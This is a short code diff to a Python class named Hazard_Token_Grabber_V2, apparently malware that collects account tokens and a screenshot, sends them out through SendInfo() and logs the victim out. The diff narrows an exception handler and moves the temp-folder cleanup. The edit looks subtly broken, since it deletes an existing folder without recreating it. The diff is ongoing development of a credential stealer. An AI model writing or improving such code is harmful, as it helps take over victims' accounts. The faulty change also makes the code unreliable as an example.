@@ -23,7 +23,8 @@ class Hazard_Token_Grabber_V2:
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
-        except:
+        except (PermissionError, FileExistsError):
+            shutil.rmtree(self.tempfolder)
             pass
 
         self.tokens = []
@@ -38,7 +39,6 @@ class Hazard_Token_Grabber_V2:
         self.screenshot()
         self.SendInfo()
         self.LogOut()
-        shutil.rmtree(self.tempfolder)
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
